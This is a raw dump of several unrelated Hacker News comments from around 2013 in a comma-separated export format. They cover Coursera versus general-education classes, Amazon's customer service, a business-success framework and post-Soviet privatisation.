You're acting like dragging students through a muck of 20-30 TA or GTF taught classes, that are outside the student's major, and often outside their interests due to strict guidelines for class choices for gen-ed, is the gold standard of a good education. Check your premises as to the value of such a program and the resulting degree. I would argue, quite easily, that a student completing 10 Coursera classes in the field their interested in, already outweighs, in usefulness towards personal and career skills, those 20-30 gen-ed classes and probably provides a higher quality of education for the remaining major courses.<p>2. My experience is with Coursera, so I will only make points based on that. Coursera is finding the nation's (maybe even world's) best teachers for each subject. You may be able to go to Stanford and get a couple of the best experts to teach you on their subject, but any given bachelors program can only hope to have 1 best-in-class teacher. I have taken 2 Coursera classes, and can tell you the quality of the teaching is much, MUCH higher than my bachelor's program. There's really no comparison of the level of quality of the education from a Coursera class, to any non absolute top of the top tier schools.<p>3. These are retention rates with absolutely no external rewards. You might get a certificate (of no explicit value) if you're lucky. But there are no degree programs, there really is no external motivation (or negative reinforcement) around class completion. To compare the figures with traditional universities, where students have numerous external motivations, consequences for failing, etc. is just naive, inconsequential, stupid, etc.",1362292963

5312743,comment,5312346,5312498,3,0,ryanmolden,,,"Or maybe your experience is an anomaly and it isn't that Amazon has just brainwashed everyone else via their clever marketing. I have bought a large number of items from Amazon, the price has always been competitive and even where slightly higher knowing I am not simply dealing with some remote company who managed to slap together a web page and who will have god knows what kind of service if I have a problem is worth some small(ish) price differential. As another anecdote, opposite to yours, a few years ago for Christmas I bought a flat panel monitor for my mom. It was kind of late and I did three day delivery. It was dropped on my porch (according to UPS) and was not there when I got home. I wrote Amazon expressing a bit of annoyance that they (actually, UPS) hadn't required a signature for a $400 monitor and just left it on my porch where it was apparently stolen. They were apologetic and said they would send another one overnight. It arrived early the next afternoon. No mixups, no blaming the shipper, no ""sorry we will get you a replacement in a week"", just good customer service, and on a tight deadline too. That said, I could be the anomaly, but I have heard similar good customer service stories from Amazon and Zappos (who Amazon bought and whose CEO is notorious for focusing on customer sat, which may have rubbed off in some small way on Amazon).",1362291268

What can I be best in the world at? What drives the economic engine of it?<p>He said it takes all three to have something successful and sustaining.  If it's just passion and being the best but there's no money making engine, it's just a hobby.  If you have an economic engine and passion but you're not the best, it will never grow past a certain point.  If you're good at it and you can make money, you'll hate it after awhile.<p>Now I personally like to believe that if you're the best in the world at something you're going to make money, but that's career wise, I'm talking about business wise.  I feel a lot of companies are lucky that don't have a solid business plan but have become uber successful.  The risk is certainly there, and it will probably tighten the gap of repeatability in the near future as well.  All this to say, find your passion, be good at it, and figure out how to make money from it.",1362290805

Where as Perestroika was supposed to be a transition from authoritarian communism to democratic communism, the dissolution of the Soviet Union resulted in a transition from authoritarian communism to authoritarian capitalism.<p>State industries were basically given away to a small oligarchy through the ""loans for shares"" program, which resulted in a virtually identical experience for the average Russian, only without the nice state provided pension and benefits.<p>Russia also has an enormous rural population, which was celebrated and idolized through Soviet ideology.
